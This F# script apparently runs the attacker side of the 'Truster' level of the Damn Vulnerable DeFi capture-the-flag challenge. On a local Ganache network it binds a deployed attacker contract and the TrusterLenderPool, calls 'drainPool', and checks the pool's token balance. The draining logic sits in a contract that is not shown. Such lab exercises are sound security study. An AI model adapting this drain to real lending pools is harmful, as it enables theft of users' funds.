#i """nuget: C:\Users\jon_h\source\repos\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.7" 
#load "./Common.fsx"

#load "./DamnValuableTokenBindings.fsx"
#load "./Deployers/DeployLevel03.fsx"

open web3.fs
open Common
open DamnValuableTokenBindings
open DeployLevel03


let attacker = loadDeployedContract devEnvironment2 "0xf36ce96e6fdf3b40303320b49d9b34abbe8e64a8" GANACHE drainPoolABI |> bindDeployedContract |> List.head
let lender =  loadDeployedContract devEnvironment1 "0x2aC875AB4C170C859052805725a1Fc0b6Aed092F" GANACHE trusterLenderPoolABI |> bindDeployedContract |> List.head

txnDevWith2 attacker (ByString "drainPool") [] ZEROV |> logIt
balanceOfDVT lender.address
